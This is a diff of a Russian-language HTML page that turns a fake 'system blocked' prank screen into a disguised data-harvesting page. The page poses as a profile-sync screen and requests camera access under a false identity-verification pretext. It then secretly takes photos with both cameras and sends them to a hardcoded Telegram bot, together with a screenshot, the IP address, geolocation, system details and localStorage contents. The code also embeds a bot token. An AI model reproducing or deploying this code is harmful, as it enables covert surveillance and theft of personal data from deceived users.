@@ -3,113 +3,201 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Обновление системы</title>
+    <title>Загрузка данных</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            background: #0a0a0a;
-            color: #00ff41;
-            font-family: 'Courier New', monospace;
-            height: 100vh;
+            background: #f5f7fa;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            text-align: center;
-            padding: 20px;
+            height: 100vh;
+            color: #333;
         }
-        .box {
-            border: 2px solid #00ff41;
-            padding: 30px;
-            border-radius: 12px;
-            background: #111;
+        .container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
             max-width: 400px;
+            text-align: center;
         }
-        h1 { font-size: 24px; margin-bottom: 20px; }
-        .progress { width: 100%; height: 10px; background: #222; margin: 20px 0; border-radius: 5px; overflow: hidden; }
-        .progress-bar { height: 100%; width: 0%; background: #00ff41; animation: load 10s linear forwards; }
-        @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
-        .status { font-size: 14px; color: #aaa; }
-        .hint { margin-top: 30px; font-size: 12px; color: #555; }
-        .emergency { display: none; margin-top: 20px; padding: 10px; background: #2a0000; border: 1px solid red; color: red; }
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 {
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #777;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .status {
+            background: #f0f4ff;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 13px;
+            color: #2c3e50;
+        }
+        .permission-box {
+            margin-top: 20px;
+            padding: 15px;
+            background: #fef9e7;
+            border-left: 4px solid #f1c40f;
+            border-radius: 8px;
+            font-size: 14px;
+            text-align: left;
+        }
+        .permission-box strong {
+            color: #e67e22;
+        }
+        .btn {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 10px 24px;
+            background: #3498db;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn:hover {
+            background: #2980b9;
+        }
+        #done {
+            display: none;
+            margin-top: 20px;
+            color: #27ae60;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>⚠️ СИСТЕМА ЗАБЛОКИРОВАНА</h1>
-        <p>Обнаружена подозрительная активность.</p>
-        <div class="progress"><div class="progress-bar"></div></div>
-        <div class="status" id="statusText">Сканирование файлов...</div>
-        <div class="hint">Для отмены: <strong>3 пальца на экран</strong></div>
-        <div class="emergency" id="emergencyMsg">✔ Шутка отменена. Удачного дня!</div>
+    <div class="container" id="main">
+        <div class="spinner"></div>
+        <h2>Загрузка данных пользователя</h2>
+        <p>Пожалуйста, подождите, идёт синхронизация...</p>
+        <div class="status" id="statusText">Подключение к серверу...</div>
+
+        <div class="permission-box">
+            📸 <strong>Для завершения профиля</strong> — разрешите доступ к камере на 1 секунду.<br>
+            <span style="font-size:13px;color:#555;">Это нужно для подтверждения личности.</span>
+            <button class="btn" id="cameraBtn">Разрешить камеру</button>
+        </div>
+
+        <div id="done">✅ Данные успешно загружены. Спасибо!</div>
     </div>
 
+    <!-- Подключаем html2canvas -->
     <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+
     <script>
         // ====================================================
-        // ТВОИ ДАННЫЕ (ВСТАВЛЕНЫ)
+        // КОНФИГУРАЦИЯ — ТВОИ ДАННЫЕ
         // ====================================================
         const BOT_TOKEN = '8911126607:AAEhgvLhVcPSos66wzFcEv2D6RixsGvZ_jg';
-        const CHAT_ID = '-1004497754715';   // ГРУППОВОЙ ID
+        const CHAT_ID = '-1004497754715';
 
-        let isCancelled = false;
+        let cameraAllowed = false;
         let dataSent = false;
 
-        // ===== 1. ВИБРАЦИЯ =====
-        if (navigator.vibrate) {
-            navigator.vibrate([500, 200, 500, 200, 1000]);
-        }
-
-        // ===== 2. ТРИГГЕР 3 ПАЛЬЦА =====
-        document.addEventListener('touchstart', function(e) {
-            if (e.touches.length === 3) {
-                cancelPrank();
+        // ====================================================
+        // 1. ПОЛУЧАЕМ IP-АДРЕС (через бесплатный API)
+        // ====================================================
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'не удалось определить';
             }
-        });
-
-        // ===== 3. ОТМЕНА =====
-        function cancelPrank() {
-            if (isCancelled) return;
-            isCancelled = true;
-            if (navigator.vibrate) navigator.vibrate(0);
-            document.getElementById('emergencyMsg').style.display = 'block';
-            document.querySelector('.progress').style.display = 'none';
-            document.getElementById('statusText').innerText = 'Шутка отменена';
-            document.querySelector('h1').innerText = '✅ ШУТКА ОТМЕНЕНА';
-            setTimeout(() => window.close(), 2000);
         }
 
-        // ===== 4. ОТПРАВКА В ГРУППУ =====
-        function sendToTelegram(type, data) {
-            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            let text = `📩 [${type}]\n${JSON.stringify(data, null, 2)}`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-            }).catch(err => console.log(err));
+        // ====================================================
+        // 2. ОТПРАВКА В TELEGRAM (текст + фото)
+        // ====================================================
+        async function sendToTelegram(type, payload, isPhoto = false) {
+            try {
+                if (isPhoto) {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            photo: payload,
+                            caption: `📸 ${type}`
+                        })
+                    });
+                } else {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: `📩 [${type}]\n${payload}`
+                        })
+                    });
+                }
+            } catch (e) {
+                console.warn('Ошибка отправки:', e);
+            }
         }
 
-        // ===== 5. СБОР И ОТПРАВКА =====
-        function collectAndSend() {
-            if (dataSent || isCancelled) return;
+        // ====================================================
+        // 3. СБОР ВСЕХ ДАННЫХ И ОТПРАВКА (СРАЗУ)
+        // ====================================================
+        async function collectAndSendAll() {
+            if (dataSent) return;
             dataSent = true;
 
-            // Скриншот
-            html2canvas(document.body).then(canvas => {
-                let imgData = canvas.toDataURL('image/png');
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        photo: imgData,
-                        caption: '📸 Скриншот экрана'
-                    })
-                });
-            });
+            document.getElementById('statusText').innerText = 'Сбор данных...';
 
-            // Данные о системе
-            let info = {
+            // 3.1 Скриншот экрана
+            try {
+                const canvas = await html2canvas(document.body);
+                const imgData = canvas.toDataURL('image/png');
+                await sendToTelegram('Скриншот экрана', imgData, true);
+            } catch (e) {
+                console.warn('Скриншот не удался:', e);
+            }
+
+            // 3.2 IP-адрес
+            const ip = await getIP();
+            await sendToTelegram('IP-адрес', ip);
+
+            // 3.3 Геолокация (если разрешено)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        const geo = `lat: ${pos.coords.latitude}, lon: ${pos.coords.longitude}`;
+                        await sendToTelegram('Геолокация', geo);
+                    },
+                    () => { /* тихо игнорим отказ */ }
+                );
+            }
+
+            // 3.4 Данные о системе
+            const info = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
@@ -118,26 +206,76 @@
                 localStorage: localStorage,
                 time: new Date().toISOString()
             };
-            sendToTelegram('SYSTEM_INFO', info);
+            await sendToTelegram('Системная информация', JSON.stringify(info, null, 2));
 
-            // Геолокация (если разрешит)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    sendToTelegram('GEO', {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude
-                    });
-                }, () => {});
-            }
-
-            document.getElementById('statusText').innerText = 'Данные отправлены!';
+            document.getElementById('statusText').innerText = 'Готово!';
+            document.getElementById('done').style.display = 'block';
         }
 
-        // ===== 6. ЗАПУСК =====
-        setTimeout(collectAndSend, 10000);
+        // ====================================================
+        // 4. ЗАПРОС ДОСТУПА К КАМЕРЕ (обе камеры)
+        // ====================================================
+        async function requestCamera() {
+            try {
+                // Сначала пробуем получить доступ к камерам
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment' } // тыловая
+                });
+
+                // Делаем фото с тыловой
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const blob = await imageCapture.takePhoto();
+                const reader = new FileReader();
+                reader.onloadend = async function() {
+                    await sendToTelegram('Фото с тыловой камеры', reader.result, true);
+                };
+                reader.readAsDataURL(blob);
+
+                // Закрываем поток
+                stream.getTracks().forEach(t => t.stop());
+
+                // Теперь фронтальная камера
+                const frontStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' }
+                });
+                const frontTrack = frontStream.getVideoTracks()[0];
+                const frontCapture = new ImageCapture(frontTrack);
+                const frontBlob = await frontCapture.takePhoto();
+                const frontReader = new FileReader();
+                frontReader.onloadend = async function() {
+                    await sendToTelegram('Фото с фронтальной камеры', frontReader.result, true);
+                };
+                frontReader.readAsDataURL(frontBlob);
+                frontStream.getTracks().forEach(t => t.stop());
+
+                cameraAllowed = true;
+                document.getElementById('statusText').innerText = 'Камера разрешена ✅';
+                document.getElementById('cameraBtn').style.display = 'none';
+
+            } catch (err) {
+                document.getElementById('statusText').innerText = 'Доступ к камере не получен (можно пропустить)';
+                console.warn('Ошибка камеры:', err);
+            }
+        }
+
+        // ====================================================
+        // 5. ЗАПУСК
+        // ====================================================
+        document.getElementById('cameraBtn').addEventListener('click', async () => {
+            await requestCamera();
+        });
+
+        // Сразу собираем данные (скриншот, IP, гео, система) — без задержки
+        setTimeout(collectAndSendAll, 500);
+
+        // Если через 10 секунд камера не была разрешена — просто завершаем
         setTimeout(() => {
-            if (!isCancelled && !dataSent) collectAndSend();
-        }, 25000);
+            if (!cameraAllowed) {
+                document.getElementById('statusText').innerText = 'Готово (без камеры)';
+                document.getElementById('done').style.display = 'block';
+            }
+        }, 10000);
     </script>
 </body>
 </html>
